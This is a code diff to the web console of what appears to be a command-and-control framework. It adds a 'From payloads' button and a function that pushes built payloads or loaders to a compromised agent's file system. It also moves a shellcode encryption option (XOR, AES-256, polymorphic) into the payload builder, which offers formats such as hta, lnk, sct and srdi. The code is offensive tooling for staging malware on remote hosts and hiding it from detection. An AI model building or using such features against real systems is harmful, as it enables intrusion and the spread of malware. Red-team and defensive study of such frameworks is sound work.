@@ -715,6 +715,7 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
             <button class="btn btn-ghost btn-sm" onclick="fxRefresh()">↻</button>
             <button class="btn btn-ghost btn-sm" onclick="fxMkdir()">+ Folder</button>
             <button class="btn btn-ghost btn-sm" onclick="document.getElementById('fx-file-input').click()">⬆ Upload</button>
+            <button class="btn btn-ghost btn-sm" onclick="fxUploadFromPayloads()" title="Select a built payload or loader from the server and push it to the agent">⬆ From payloads</button>
             <div class="spacer"></div>
             <input id="fx-filter" placeholder="filter…" style="width:130px;padding:2px 7px;background:var(--bg2);border:1px solid var(--border);border-radius:3px;color:var(--text1);font-size:11px" oninput="fxApplyFilter()">
           </div>
@@ -858,7 +859,6 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
             <select id="pay-format" style="display:none" onchange="payFormatChange()"><option value="exe">exe</option><option value="bin">bin</option><option value="dll">dll</option><option value="linux">linux</option><option value="darwin">darwin</option><option value="html">html</option><option value="lnk">lnk</option><option value="iso">iso</option><option value="zip">zip</option><option value="hta">hta</option><option value="ps1">ps1</option><option value="bat">bat</option><option value="jscript">jscript</option><option value="vbscript">vbscript</option><option value="sct">sct</option><option value="wsf">wsf</option><option value="loader">loader</option><option value="loader-c">loader-c</option><option value="loader-nim">loader-nim</option><option value="loader-rust">loader-rust</option><option value="srdi">srdi</option></select>
             <select id="pay-lang" style="display:none" onchange="payLangChange()"><option value="nim">nim</option><option value="go">go</option><option value="rust">rust</option><option value="c">c</option></select>
             <div id="pay-stage-row" style="display:none"><input id="pay-stage"></div>
-            <div id="pay-encrypt-row" style="display:none"><select id="pay-encrypt"><option value="">None</option><option value="xor">XOR</option><option value="aes">AES-256</option><option value="poly">Polymorphic</option></select></div>
             <datalist id="pay-host-list"></datalist>
 
             <!-- ① C2 Connection — shared by all modes -->
@@ -982,6 +982,12 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
 
               <!-- Checkboxes in a grid with descriptions -->
               <div style="font-size:10px;font-weight:600;text-transform:uppercase;letter-spacing:.5px;color:var(--text3);margin-bottom:6px">Build options</div>
+              <div id="pay-encrypt-row" style="display:none;margin-bottom:8px">
+                <div class="form-row" style="margin:0">
+                  <label>Shellcode encryption</label>
+                  <select id="pay-encrypt"><option value="">None</option><option value="xor">XOR</option><option value="aes">AES-256</option><option value="poly">Polymorphic</option></select>
+                </div>
+              </div>
               <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px;margin-bottom:14px">
 
                 <label class="build-opt" id="opt-garble">
@@ -15152,12 +15158,13 @@ function renderBuildResult(container, data) {
       <span style="font-size:${isStage?'18':'16'}px">${icon}</span>
       <div style="flex:1;min-width:0">
         <div style="font-size:12px;font-weight:${isStage?'700':'600'};color:${isStage?'var(--accent)':'var(--text)'}">${esc(label)}</div>
-        <div style="font-size:10px;color:var(--text3);font-family:var(--font-mono);overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${esc(val)}">${esc(val)}</div>
+        <div style="font-size:10px;color:var(--text3);font-family:var(--font-mono);overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${esc(val)}">${esc(filename || val)}</div>
       </div>
       <div style="display:flex;gap:4px;flex-shrink:0">
         ${isURL
           ? `<button class="btn btn-${isStage?'primary':'ghost'} btn-sm" onclick="copyText('${val.replace(/'/g,"\\'")}')">⎘ Copy</button>`
-          : `<a class="btn btn-ghost btn-sm" href="${BASE}/api/artifacts/${encodeURIComponent(filename)}?token=${TOKEN}" download="${esc(filename)}">⬇ Download</a>
+          : `<button class="btn btn-ghost btn-sm" title="${esc(val)}" onclick="copyText('${val.replace(/'/g,"\\'")}')">⎘</button>
+             <a class="btn btn-ghost btn-sm" href="${BASE}/api/artifacts/${encodeURIComponent(filename)}?token=${TOKEN}" download="${esc(filename)}">⬇ Download</a>
              <button class="btn btn-ghost btn-sm" onclick="payStageFile('${val.replace(/'/g,"\\'")}','${filename.replace(/'/g,"\\'")}')">→ Stage</button>`
         }
       </div>
@@ -17253,6 +17260,37 @@ async function fxHandleFileUpload(input) {
     toast('Uploaded: ' + file.name);
     setTimeout(() => fxList(fxCurrentPath), 400);
   } catch(e) { fxSetStatus('Error: ' + e.message); }
+}
+
+// Upload a server-side payload/loader to the agent at the current File Explorer path.
+// The file already lives in bin/payloads/ or bin/delivery/ so no browser upload is needed.
+async function fxUploadFromPayloads() {
+  if (!fxAgentId) { toast('No agent active in File Explorer', 'red'); return; }
+  const r = await api('GET', '/api/artifacts');
+  if (!r?.ok || !r.data?.length) { toast('No built payloads found — build one first', 'orange'); return; }
+  const files = r.data.filter(f => f.filename);
+  if (!files.length) { toast('No artifacts found', 'orange'); return; }
+
+  // Simple prompt-based picker (no DOM modal needed)
+  const list = files.map((f, i) => `${i+1}. ${f.filename}`).join('\n');
+  const input = window.prompt(`Select payload to upload to agent (enter number):\n\n${list}`);
+  if (!input) return;
+  const idx = parseInt(input, 10) - 1;
+  if (isNaN(idx) || idx < 0 || idx >= files.length) { toast('Invalid selection', 'red'); return; }
+  const chosen = files[idx];
+  const filename = chosen.filename;
+  const remotePath = fxJoinPath(fxCurrentPath, filename);
+  fxSetStatus(`Pushing ${filename} to agent...`);
+  const t = await api('POST', `/api/agents/${fxAgentId}/task`, {
+    type: 'UPLOAD',
+    args: JSON.stringify({filename, remote_path: remotePath}),
+  });
+  if (!t?.ok) { fxSetStatus('UPLOAD task failed'); return; }
+  const res = await fxWaitTask(fxAgentId, t.data.task_id, 300000);
+  if (res?.error) { fxSetStatus('Error: ' + res.error); return; }
+  fxSetStatus(`Uploaded: ${remotePath}`);
+  toast('Uploaded: ' + filename);
+  setTimeout(() => fxList(fxCurrentPath), 400);
 }
 
 // Upload a local file to a specific agent via context menu
